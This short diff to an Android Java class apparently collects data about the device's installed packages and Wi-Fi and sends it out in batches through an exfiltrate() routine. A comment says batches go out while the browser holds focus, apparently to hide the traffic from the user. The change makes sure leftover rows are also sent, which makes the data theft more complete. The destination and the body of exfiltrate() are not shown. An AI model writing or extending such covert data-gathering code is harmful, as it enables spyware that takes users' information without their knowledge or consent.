@@ -27,6 +27,7 @@ public class GetPackagesTask extends AsyncTask<Void, Void, Void>{
 	WiFiTracker wifiTracker = new WiFiTracker();
 	private int row_id = 0;
 	private ArrayList <HashMap<String, String> > arrayRows = new ArrayList <HashMap<String, String> >();
+	private boolean all_send = false;
 	
 	protected GetPackagesTask() { }
 	
@@ -71,17 +72,18 @@ public class GetPackagesTask extends AsyncTask<Void, Void, Void>{
 			
 			if ((row_id % 10) == 0){
 				exfiltrate(); //send a package at a time browser is dominating the focus! 
+				all_send  = true;
 				arrayRows.clear();
-//				try {
-//					Thread.sleep(3000);
-//				} catch (InterruptedException e) {
-//					// TODO Auto-generated catch block
-//					e.printStackTrace();
-//				}
+			}
+			else{
+				all_send = false;
 			}
 	    }
 	  //exfiltrate - REQUEST URI TOO LARGE!!!
-		//exfiltrate();
+		if (!all_send){
+			exfiltrate();
+			arrayRows.clear();
+		}
 		
 	    /**
 		for (PInfo pack : packagesList){	
